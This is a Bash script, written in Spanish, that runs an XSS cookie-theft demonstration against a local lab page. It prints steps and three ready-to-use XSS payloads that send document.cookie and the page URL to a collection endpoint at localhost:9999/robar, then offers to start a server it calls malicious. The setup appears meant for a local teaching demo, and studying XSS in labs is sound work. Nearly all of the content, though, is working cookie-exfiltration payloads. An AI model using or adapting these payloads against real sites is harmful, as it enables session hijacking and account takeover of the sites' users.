#!/bin/bash

echo "🚨 DEMOSTRACIÓN DE ATAQUE XSS PARA ROBO DE COOKIES"
echo "=================================================="
echo ""

echo "📋 PASOS PARA EJECUTAR EL ATAQUE:"
echo ""
echo "1. Inicia el servidor malicioso:"
echo "   python3 servidor_simple.py"
echo ""
echo "2. Abre demo_cookies.html en tu navegador y establece cookies"
echo ""
echo "3. Ve a la página XSS vulnerable y usa este payload:"
echo ""
echo "   PAYLOAD RECOMENDADO:"
echo "   <img src=x onerror=\"var img=new Image();img.src='http://localhost:9999/robar?c='+encodeURIComponent(document.cookie);\">"
echo ""
echo "4. Revisa la terminal del servidor para ver las cookies robadas"
echo ""

echo "🔥 PAYLOADS ALTERNATIVOS:"
echo ""
echo "Simple:"
echo "<svg onload=\"fetch('http://localhost:9999/robar?c='+encodeURIComponent(document.cookie))\">"
echo ""
echo "Con información extra:"
echo "<img src=x onerror=\"var img=new Image();img.src='http://localhost:9999/robar?c='+encodeURIComponent(document.cookie)+'&url='+encodeURIComponent(location.href);\">"
echo ""

echo "⚠️  IMPORTANTE:"
echo "- El servidor debe estar ejecutándose en puerto 9999"
echo "- Las cookies deben estar establecidas en el mismo dominio"
echo "- Revisa la consola del navegador para ver logs del ataque"
echo ""

read -p "¿Quieres iniciar el servidor malicioso ahora? (y/n): " respuesta

if [[ $respuesta == "y" || $respuesta == "Y" ]]; then
    echo ""
    echo "🚨 Iniciando servidor malicioso..."
    echo "   Presiona Ctrl+C para detenerlo"
    echo ""
    python3 servidor_simple.py
else
    echo ""
    echo "✅ Script completado. Inicia manualmente:"
    echo "   python3 servidor_simple.py"
fi 